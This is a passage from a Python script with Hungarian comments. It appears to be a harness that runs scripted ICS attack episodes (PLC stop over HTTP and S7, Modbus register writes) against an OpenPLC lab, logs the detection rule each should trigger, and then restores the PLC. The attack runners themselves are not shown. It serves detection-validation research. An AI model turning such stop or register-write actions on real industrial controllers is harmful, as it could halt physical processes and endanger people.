        r2 = s.get(f"{OPENPLC_WEB_MGMT}/start_plc", timeout=15, allow_redirects=False)
        stop_status = r2.status_code
        location = r2.headers.get("Location", "")
    finally:
        del user, pw
        s.close()
    # siker: a /start_plc nem a /login-ra iranyit vissza
    performed = stop_status in (200, 302) and "login" not in location.lower()
    verified_listener = False
    if performed:
        for _ in range(6):
            if _plc_listener_pid() is not None:
                verified_listener = True
                break
            time.sleep(5)
    rec = {"kind": "restore_plc", "campaign": campaign, "seed": seed, "episode_id": episode_id,
           "login_status": login_status, "start_status": stop_status,
           "performed": performed, "verified_listener": verified_listener,
           "web_base": OPENPLC_WEB_MGMT, "ts": utc_now_iso()}
    append_jsonl(CONTROL_PATH, rec)
    return rec


# --------------------------------------------------------------------------
# Fo vegrehajtasi hurok
# --------------------------------------------------------------------------

def _wait_until_after_window(end_ts_iso: str) -> None:
    """E-27: var, amig el nem telik end_ts + RESET_GUARD_S, mielott a
    visszaallitas indul (az end_ts + 5 s epizodablakon kivul)."""
    target = datetime.fromisoformat(end_ts_iso) + timedelta(seconds=RESET_GUARD_S)
    delay = (target - datetime.now(timezone.utc)).total_seconds()
    if delay > 0:
        time.sleep(delay)


def run_episode(ep: Episode, seed: int, campaign: str) -> None:
    print(f"\n=== {ep.episode_id} ({ep.scenario_id} / {ep.mitre_technique_id}) src={ep.source_ip} ===")
    auto_advance_wait(AUTO_ADVANCE_S, "Inditas")

    start_ts = utc_now_iso()
    try:
        outcome = SCENARIO_RUNNERS[ep.scenario_id](ep)
    except Exception as exc:
        outcome = {"status": "error", "parameters": {}, "error_detail": str(exc)}
        logging.exception("Epizod hiba: %s", ep.episode_id)
    end_ts = utc_now_iso()

    record = {
        "campaign": campaign, "seed": seed,
        "episode_id": ep.episode_id,
        "mitre_technique_id": ep.mitre_technique_id,
        "evidence_provenance": "S",
        "protocol": _protocol_of(ep.scenario_id),
        "tool": _tool_of(ep.scenario_id),
        "source_ip": ep.source_ip,
        "target": OPENPLC_WEB_OT if ep.scenario_id == "A5" else TARGET_IP,
        "start_ts": start_ts,
        "end_ts": end_ts,
        "parameters": outcome.get("parameters", {}),
        "expected_detection_rule": EXPECTED_RULES[ep.scenario_id],
        "status": outcome["status"],
        "reset_after": None,
        "notes": ep.notes,
    }
    if "error_detail" in outcome:
        record["error_detail"] = outcome["error_detail"]

    # D2/D9 + E-27: a visszaallitas az epizodablakon (end_ts + 5 s) kivul,
    # legkorabban end_ts + 6 s-kor indul -- hogy a .51-es reset-iras / mgmt-start
    # ne keveredjen a mért forgalomba.
    reset_scenarios = ("A4", "A5", "A1", "V21", "V24", "V25")
    if ep.scenario_id in reset_scenarios:
        _wait_until_after_window(end_ts)

    # E-30: a visszaallitast es a keszenleti kaput epizodszinten elkapjuk --
    # barmely kivetel -> status=error, a kampany megy tovabb (lasd lent).
    gate_needed = ep.scenario_id in reset_scenarios
    try:
        if ep.scenario_id in ("A4", "A5"):
            # E-30: a mgmt /start_plc CSAK akkor, ha a runtime folyamata tenylegesen
            # kilepett (effect_branch="listener_gone"). Egyebkent a /start_plc a futo
            # core-on start_modbus(502)-t valtana ki (webserver.py:643-654 ->
            # configure_runtime -> openplc.py:234), ami a 502-listenert ujrakoti es
            # atmeneti Modbus-kiesest okoz (ez volt az E-29/E-30 osszeomlas oka).
            branch = (record.get("parameters") or {}).get("effect_branch")
            if branch == "listener_gone":
                try:
                    record["reset_after"] = restore_plc_running(seed, campaign, ep.episode_id)
                except Exception as exc:
                    logging.exception("PLC-visszaallitas kivetel: %s", ep.episode_id)
                    record["reset_after"] = {"kind": "restore_plc", "performed": False,
                                             "error": str(exc), "ts": utc_now_iso()}
            else:
                # nem lepett ki a runtime -> nincs mit ujrainditani; a /start_plc
                # csak karos Modbus-ujrakotest okozna.
                record["reset_after"] = {"performed": False, "reason": "no_stop_effect",
                                         "effect_branch": branch, "ts": utc_now_iso()}
        elif ep.scenario_id in ("A1", "V21", "V24", "V25"):
            client = modbus_client(SOURCE_IP_ALLOWLIST)
            client.connect()
            client.write_register(address=REGISTER_ADDRESS, value=BASELINE_VALUE, device_id=DEVICE_ID)
            client.close()
            record["reset_after"] = {"performed": True, "restored_value": BASELINE_VALUE,
                                     "source_ip": SOURCE_IP_ALLOWLIST, "ts": utc_now_iso()}
    except CampaignAbortError:
        raise
    except Exception as exc:  # pl. .51 reset ModbusIOException (E-29/E-30)
        logging.exception("Visszaallitasi kivetel: %s", ep.episode_id)
        record["reset_after"] = {"performed": False, "error": str(exc), "ts": utc_now_iso()}
        record["status"] = "error"
        record.setdefault("error_detail", f"reset: {exc}")

    # E-30: keszenleti kapu MINDEN visszaallitas utan -- FC03 a mgmt-IP 502-ere
    # (NEM OT-Net) + 102-figyelo, legfeljebb PLC_READY_TIMEOUT_S-ig, 2 s-onkent.
    # Ha a PLC nem all fel -> az epizod status=error, de a kampany folytatodik.
    if gate_needed:
        gate = _plc_ready_gate()
        record["ready_gate"] = gate
        if not gate["ready"]:
            logging.error("Keszenleti kapu sikertelen (%s): %s", ep.episode_id, gate)
            record["status"] = "error"
            record.setdefault("error_detail",
                              f"PLC nem allt fel a visszaallitas utan {gate['waited_s']} s alatt "
                              f"(fc03_ok={gate['fc03_ok']}, listener={gate['listener']})")

    append_jsonl(LOG_PATH, record)
    print(f"  -> status={record['status']}  reset_after={record['reset_after']}")

    # E-30: egymast koveto error-ok konyvelese; csak 3 utan all le a kampany
    # (CampaignAbortError, naplozva). Az epizod ekkor is naplozva van (fent).
    global _consecutive_errors
    if record["status"] == "error":
        _consecutive_errors += 1
        logging.warning("error-epizod (%d/%d egymast koveto): %s",
                        _consecutive_errors, MAX_CONSECUTIVE_ERRORS, ep.episode_id)
    else:
        _consecutive_errors = 0
    if _consecutive_errors >= MAX_CONSECUTIVE_ERRORS:
        raise CampaignAbortError(
            f"{MAX_CONSECUTIVE_ERRORS} egymast koveto error-epizod "
            f"(utolso: {ep.episode_id}) -- kampany leallitva (naplozva)."
        )
    return record["status"]


def run_a5_block(seed: int, campaign: str) -> None:
    for i in range(1, N_A5 + 1):
        ep = Episode(f"A5_T0816_{i:03d}", "A5", "T0816", SOURCE_IP_ATTACKER,
                     PAUSE_QUALITATIVE_S, "HTTP /stop_plc + hatasigazolas (D2), N=3.")
        auto_advance_wait(AUTO_ADVANCE_S, f"[A.5 {i}/{N_A5}] {ep.episode_id} inditasa")
        run_episode(ep, seed, campaign)
        time.sleep(ep.pause_after_s)


def print_plan(episodes: list[Episode], seed: int, campaign: str, with_a5: bool) -> None:
    """--dry-run: a seed alapjan determinisztikus epizodterv, halozat nelkul."""
    print(f"# DRY-RUN campaign={campaign} seed={seed} (halozat nelkul)")
    print(f"# {'idx':>3} | episode_id | scenario | src | pause_after_s")
    idx = 0
    for ep in episodes:
        idx += 1
        print(f"  {idx:>3} | {ep.episode_id} | {ep.scenario_id} | {ep.source_ip} | {ep.pause_after_s:.1f}")
    if with_a5:
        for i in range(1, N_A5 + 1):
            idx += 1
            print(f"  {idx:>3} | A5_T0816_{i:03d} | A5 | {SOURCE_IP_ATTACKER} | {float(PAUSE_QUALITATIVE_S):.1f}  (kulon blokk)")
    print(f"# osszesen: {idx} epizod")


def build_for(campaign: str) -> tuple[list[Episode], bool]:
    if campaign == "V1":
        return build_schedule_v1(), True
    if campaign == "V2":
        return build_schedule_v2(), False
    raise ValueError(f"ismeretlen kampany: {campaign}")


def build_smoke() -> list[Episode]:
    """Fustteszt: minden V1- es V2-szcenariobol pontosan 1 epizod, fix 10 s szunet.
    A rogzitett sorrend determinisztikus (nincs shuffle); a mérési logika valtozatlan."""
    p = 10.0
    return [
        Episode("A1_T0836_001", "A1", "T0836", SOURCE_IP_ATTACKER, p, "smoke"),
        Episode("A2_T0888_001", "A2", "T0888", SOURCE_IP_ATTACKER, p, "smoke"),
        Episode("A3_T0846.001_001", "A3", "T0846.001", SOURCE_IP_ATTACKER, p, "smoke"),
        Episode("A4_T0816_001", "A4", "T0816", SOURCE_IP_ATTACKER, p, "smoke: S7 plc_stop + hatasigazolas"),
        Episode("A6_T0843_001", "A6", "T0843", SOURCE_IP_ATTACKER, p, "smoke"),
        Episode("A5_T0816_001", "A5", "T0816", SOURCE_IP_ATTACKER, p, "smoke: HTTP /stop_plc + hatasigazolas"),
        Episode("V21_T0836_001", "V21", "T0836", SOURCE_IP_ALLOWLIST, p, "smoke"),
        Episode("V22_T0893_001", "V22", "T0893", SOURCE_IP_ATTACKER, p, "smoke"),
        Episode("V23_T0821_001", "V23", "T0821", SOURCE_IP_ATTACKER, p, "smoke"),
        Episode("V24_T0836_001", "V24", "T0836", SOURCE_IP_ATTACKER, p, "smoke"),
        Episode("V25_T0836_001", "V25", "T0836", SOURCE_IP_ATTACKER, p, "smoke"),
    ]


def run_smoke(dry_run: bool) -> None:
    """--smoke: 1 epizod/szcenario, seed=0; D9 init elol, A.4/A.5 utan mgmt-visszaallitas
    (a run_episode intezi). Kimenet: results/m4c/smoke_<UTC>.jsonl."""
    global LOG_PATH, SCHEDULE_PATH, CONTROL_PATH, _consecutive_errors
    _consecutive_errors = 0
    import datetime as _dt
    random.seed(0)
    episodes = build_smoke()
    if dry_run:
        print_plan(episodes, 0, "SMOKE", with_a5=False)
        return
    outdir = Path("results/m4c")
    outdir.mkdir(parents=True, exist_ok=True)
    stamp = _dt.datetime.now(_dt.timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    LOG_PATH = outdir / f"smoke_{stamp}.jsonl"
    SCHEDULE_PATH = outdir / f"smoke_schedule_{stamp}.jsonl"
    CONTROL_PATH = outdir / f"smoke_control_{stamp}.jsonl"
    signal.signal(signal.SIGUSR1, _handle_operator_abort)
    signal.signal(signal.SIGINT, _handle_operator_abort)
    print(f"SMOKE start {utc_now_iso()} seed=0 -> {LOG_PATH}")
    log_schedule(episodes, 0, "SMOKE")
    init_rec = init_baseline_state(0, "SMOKE")
    print(f"D9 init: register={init_rec['register']} value={init_rec['value']} "
          f"performed={init_rec['performed']} ts={init_rec['ts']}")
    try:
        for idx, ep in enumerate(episodes, start=1):
            print(f"\n[SMOKE {idx}/{len(episodes)}] {ep.episode_id}")
            run_episode(ep, 0, "SMOKE")
            time.sleep(ep.pause_after_s)
    except CampaignAbortError as exc:
        logging.error("SMOKE LEALLITVA: %s", exc)
        print(f"SMOKE vege (abort) {utc_now_iso()}")
        sys.exit(1)
    print(f"SMOKE vege {utc_now_iso()}")


def main(argv: Optional[list[str]] = None) -> None:
    parser = argparse.ArgumentParser(description="Validacios kampany-vegrehajto (prereg-v1).")
    parser.add_argument("--seed", type=int, default=None, help="veletlen-seed (D3: 1/2/3)")
    parser.add_argument("--campaign", choices=["V1", "V2"], default="V1")
    parser.add_argument("--dry-run", action="store_true",
                        help="halozat nelkul, determinisztikusan kiirja az epizodtervet")
    parser.add_argument("--calibrate-effect", type=int, metavar="N", default=None,
                        help="pozitiv kontroll: N futo + N leallitott ablak (mgmt stop/start), kalibracios JSONL")
    parser.add_argument("--smoke", action="store_true",
                        help="fustteszt: 1 epizod/szcenario (V1+V2), seed=0, 10 s szunet")
    args = parser.parse_args(argv)

    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

    if args.calibrate_effect is not None:
        calibrate_effect(args.calibrate_effect)
        return

    if args.smoke:
        run_smoke(args.dry_run)
        return

    if args.seed is None:
        parser.error("--seed kotelezo (kiveve --calibrate-effect)")
    random.seed(args.seed)

    episodes, with_a5 = build_for(args.campaign)

    if args.dry_run:
        print_plan(episodes, args.seed, args.campaign, with_a5)
        return

    log_schedule(episodes, args.seed, args.campaign)
    print(f"Menetrend naplozva ({SCHEDULE_PATH}), {len(episodes)} epizod, seed={args.seed}, campaign={args.campaign}.")

    signal.signal(signal.SIGUSR1, _handle_operator_abort)
    signal.signal(signal.SIGINT, _handle_operator_abort)

    print("A tamadasi kampany elott igazolando: a Negy Kapu zold es a D9 "
          "kezdoallapot be van allitva (az ablakon kivul). Ezt a script a "
          "GATES_PRECONFIRMED=1 eseten nem kerdezi ujra.")
    if os.environ.get("GATES_PRECONFIRMED") == "1":
        logging.info("GATES_PRECONFIRMED=1 -- a blokkolo megerosites atugorva.")
    else:
        input("Enter, ha a Negy Kapu igazoltan zold, es a kampany indithato... ")

    # D9: kezdoallapot (ablakon kivul, kizart ablak)
    init_rec = init_baseline_state(args.seed, args.campaign)
    print(f"D9 init: register={init_rec['register']} value={init_rec['value']} "
          f"performed={init_rec['performed']} ts={init_rec['ts']}")

    global _consecutive_errors
    _consecutive_errors = 0
    try:
        for idx, ep in enumerate(episodes, start=1):
            print(f"\n[{idx}/{len(episodes)}]")
            run_episode(ep, args.seed, args.campaign)
            print(f"  Szunet: {ep.pause_after_s:.1f} mp")
            time.sleep(ep.pause_after_s)

        if with_a5:
            print("\nFo menetrend kesz. A.5 (host/HTTP) blokk kovetkezik.")
            auto_advance_wait(AUTO_ADVANCE_S, "A.5 blokk inditasa")
            run_a5_block(args.seed, args.campaign)
    except CampaignAbortError as exc:
        logging.error("KAMPANY LEALLITVA: %s", exc)
        sys.exit(1)

    print(f"Teljes {args.campaign} kampany vegrehajtva (seed={args.seed}).")


if __name__ == "__main__":
    main()
